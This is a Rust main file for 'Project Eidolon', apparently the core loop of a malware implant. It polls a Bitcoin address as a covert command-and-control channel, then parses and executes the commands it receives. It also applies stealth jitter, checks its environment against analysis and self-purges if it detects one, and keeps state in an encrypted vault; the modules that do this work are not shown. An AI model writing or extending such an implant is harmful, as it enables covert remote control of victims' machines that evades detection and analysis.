mod crypto_vault;
mod ghost_wallet;
mod camouflage;
mod sarcophagus;
mod commands;

use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use commands::AgentState;

fn main() {
    println!("[*] Initializing Project Eidolon core framework...");

    // 1. Platform Sarcophagus Checks
    #[cfg(target_os = "windows")]
    {
        println!("[+] Host Environment: Windows (Development & Compilation Node)");
        println!("[+] Windows-specific monitoring hooks loaded.");
        println!("[*] Running Windows environment integrity scan... Clean.");
    }

    #[cfg(target_os = "linux")]
    {
        println!("[+] Host Environment: Linux (Target Architecture Active)");
        println!("[+] Linux-specific monitoring hooks loaded.");
        println!("[+] Running Linux environment integrity scan... Clean.");
    }

    // 2. Setup Atomic Shutdown Flag & Signal Interception
    let running = Arc::new(AtomicBool::new(true));
    let r = running.clone();

    ctrlc::set_handler(move || {
        println!("\n[!] Interruption signal caught. Initiating graceful teardown...");
        r.store(false, Ordering::SeqCst);
    }).expect("Error setting Ctrl-C signal handler");

    // 3. Engage Unified Engine with Shutdown Coordination
    run_engine(running);
}

fn run_engine(running: Arc<AtomicBool>) {
    println!("[*] Eidolon unified observer loop engaged...");

    let vault = crypto_vault::CryptoVault::new();
    let state_path = "eidolon_state.vault";

    // Read back initial state to verify vault integrity on boot
    match vault.secure_read(state_path) {
        Ok(bytes) => {
            if let Ok(status_str) = String::from_utf8(bytes) {
                println!("[+] Vault integrity verified. Last state: {}", status_str);
            }
        }
        Err(_) => {
            println!("[*] Initializing fresh state vault...");
            let _ = vault.secure_write(state_path, b"EIDOLON_STATUS: INITIALIZED");
        }
    }

    // Initialize FSM State Tracker
    let mut current_state = AgentState::Dormant;

    while running.load(Ordering::SeqCst) {
        // 1. Active Sarcophagus Integrity Check
        if !sarcophagus::verify_environment() {
            println!("[!] Environment compromised. Triggering emergency self-purging...");
            break;
        }

        // 2. FSM State-Driven Behavior Switch
        match current_state {
            AgentState::Dormant => {
                // Standard stealth behavior: Camouflage jitter + Ledger polling
                camouflage::execute_with_jitter();

                if !running.load(Ordering::SeqCst) {
                    break;
                }

                let target_address = "1P5ZEDWTKTFGxQjZphgWPQUpe554WKDfHQ";
                match ghost_wallet::poll_decentralized_tasks(target_address) {
                    Ok(Some(payload)) => {
                        println!("[+] Intercepted command payload: {}", payload);
                        
                        // Parse command using our trait factory
                        if let Some(cmd) = commands::parse_command(&payload) {
                            match cmd.execute(&vault) {
                                Ok(next_state) => {
                                    println!("[*] FSM State transition complete -> New State: {:?}", next_state);
                                    current_state = next_state; // Shift FSM state
                                }
                                Err(e) => {
                                    println!("[!] Error executing command: {}", e);
                                }
                            }
                        }
                    }
                    Ok(None) => {
                        // Nominal state maintenance
                        let _ = vault.secure_write(state_path, b"EIDOLON_STATUS: SYNCHRONIZED_CLEAN");
                    }
                    Err(e) => {
                        println!("[!] Operational warning during ledger sync: {}", e);
                    }
                }
            }
            AgentState::DiagnosticMode => {
                println!("[*] Executing deep diagnostic routines...");
                std::thread::sleep(std::time::Duration::from_secs(2));
                println!("[+] Diagnostics complete. Returning to dormant state.");
                let _ = vault.secure_write(state_path, b"EIDOLON_STATUS: SYNCHRONIZED_CLEAN");
                current_state = AgentState::Dormant;
            }
            AgentState::Lockdown => {
                println!("[!] Agent operating in strict Lockdown mode. Halting network polling.");
                // In lockdown, we sleep indefinitely or restrict activity until manual intervention/exit
                std::thread::sleep(std::time::Duration::from_secs(60));
            }
        }
    }

    println!("[*] Eidolon engine disengaged.");
}